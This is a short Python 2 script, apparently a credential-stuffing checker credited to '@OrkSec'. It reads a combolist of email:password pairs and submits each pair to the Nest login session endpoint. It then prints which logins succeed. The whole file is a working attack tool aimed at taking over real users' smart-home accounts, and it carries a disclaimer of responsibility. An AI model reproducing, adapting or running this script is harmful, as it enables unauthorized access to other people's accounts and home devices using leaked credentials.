import requests
import webbrowser
import os
url = "https://home.nest.com/session"
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def welcome():
    os.system("clear")
    print "This tool is supplied by @OrkSec."
    print "We do not take responsibility for what you do with this tool."

def checkValid(result, line):
    if "access_denied" not in result:
        print bcolors.OKGREEN + u'[\u2713] ' + line + bcolors.ENDC
    else:
        print bcolors.FAIL + '[X] ' + line + bcolors.ENDC

def importCombolist():
    print "Please drag and drop a combolist here."
    combolistPath = raw_input('==> ')
    with open(combolistPath.replace(" ", ""), 'r') as myfile:
         for line in myfile:
             payload = 0
             line = line.replace('\n', '')
             email = line.split(":")[0]
             password = line.split(":")[1]
             payload = {'email': email, 'password': password}
             with requests.session() as s:
                 s.get(url)
                 r = s.post(url, data={'email': email, 'password': password})
                 #print(r.text)
                 checkValid(r.text, line)

welcome()
importCombolist()
